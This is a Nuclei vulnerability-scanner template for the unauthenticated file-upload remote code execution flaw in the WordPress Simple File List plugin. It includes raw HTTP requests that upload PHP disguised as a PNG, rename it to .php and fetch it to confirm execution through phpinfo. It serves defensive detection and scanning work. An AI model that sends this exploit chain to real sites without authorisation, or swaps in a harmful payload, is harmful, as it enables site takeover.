id: wordpress-rce-simplefilelist
info:
  name: WordPress SimpleFilelist - Remote Code Execution
  author: princechaddha
  severity: critical
  description: The WordPress SimpleFilelist plugin was vulnerable to remote code execution
    via an unauthenticated arbitrary file upload, which allowed attackers to upload
    PHP code disguised as a png image file and subsequently rename it to a PHP file.
  reference:
  - https://wpscan.com/vulnerability/10192
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: wpscan,wordpress,wp-plugin,rce,intrusive,fileupload,python
  metadata:
    impact: The vulnerability in the SimpleFilelist WordPress plugin could result
      in devastating impact, as it allows attackers to remotely execute code and potentially
      gain control of websites.
    recommendation: It is recommended to immediately update the Simple File List WordPress
      plugin to the latest version to prevent remote code execution vulnerability.
requests:
- raw:
  - 'POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2


    --6985fa39c0698d07f6d418b37388e1b2

    Content-Disposition: form-data; name="eeSFL_ID"


    1

    --6985fa39c0698d07f6d418b37388e1b2

    Content-Disposition: form-data; name="eeSFL_FileUploadDir"


    /wp-content/uploads/simple-file-list/

    --6985fa39c0698d07f6d418b37388e1b2

    Content-Disposition: form-data; name="eeSFL_Timestamp"


    1587258885

    --6985fa39c0698d07f6d418b37388e1b2

    Content-Disposition: form-data; name="eeSFL_Token"


    ba288252629a5399759b6fde1e205bc2

    --6985fa39c0698d07f6d418b37388e1b2

    Content-Disposition: form-data; name="file"; filename="nuclei.png"

    Content-Type: image/png


    <?php echo "Nuclei - Open source project (github.com/projectdiscovery/nuclei)";
    phpinfo(); ?>

    --6985fa39c0698d07f6d418b37388e1b2--

    '
  - 'POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Accept: */*

    Content-Type: application/x-www-form-urlencoded


    eeSFL_ID=1&eeFileOld=nuclei.png&eeListFolder=%2F&eeFileAction=Rename%7Cnuclei.php

    '
  - 'GET /wp-content/uploads/simple-file-list/nuclei.php HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    '
  matchers-condition: and
  matchers:
  - type: word
    words:
    - Nuclei - Open source project (github.com/projectdiscovery/nuclei)
    - PHP Version
    - Configuration Command
    part: body
    condition: and
  - type: word
    words:
    - text/html
    part: header
  - type: status
    status:
    - 200
